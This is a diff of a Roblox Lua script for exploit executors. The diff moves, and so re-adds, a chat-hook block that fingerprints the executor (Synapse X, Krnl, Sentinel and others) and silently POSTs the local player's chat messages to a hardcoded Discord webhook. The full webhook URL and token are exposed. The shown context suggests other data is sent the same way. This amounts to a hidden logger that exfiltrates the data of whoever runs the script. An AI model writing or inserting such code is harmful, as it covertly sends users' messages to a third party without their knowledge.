@@ -1,27 +1,7 @@
 
 
 
-game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(data)
-if data.FromSpeaker == game.Players.LocalPlayer.Name then
-local webhookcheck =
-   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
-   secure_load and "Sentinel" or
-   KRNL_LOADED and "Krnl" or
-   SONA_LOADED and "Sona" or
-   "Kid with shit exploit"
-local url = "https://discord.com/api/webhooks/997590911770951740/kTOu5XN3OvDw5uMlRRZ7mj8W3MCGsnOszDVei0EUquZZJKB9i_JuGg_wBojd4OxN0obV"
-local data = {
-   ["content"] = data.FromSpeaker..": "..data.Message,
-}
-local newdata = game:GetService("HttpService"):JSONEncode(data)
-local headers = {
-   ["content-type"] = "application/json"
-}
-request = http_request or request or HttpPost or syn.request
-local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef)
-end
-end)
+
 
 
 
@@ -72,3 +52,28 @@ local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
 end)
 
+
+
+
+
+game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent:Connect(function(data)
+if data.FromSpeaker == game.Players.LocalPlayer.Name then
+local webhookcheck =
+   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+   secure_load and "Sentinel" or
+   KRNL_LOADED and "Krnl" or
+   SONA_LOADED and "Sona" or
+   "Kid with shit exploit"
+local url = "https://discord.com/api/webhooks/997590911770951740/kTOu5XN3OvDw5uMlRRZ7mj8W3MCGsnOszDVei0EUquZZJKB9i_JuGg_wBojd4OxN0obV"
+local data = {
+   ["content"] = data.FromSpeaker..": "..data.Message,
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+end
+end)
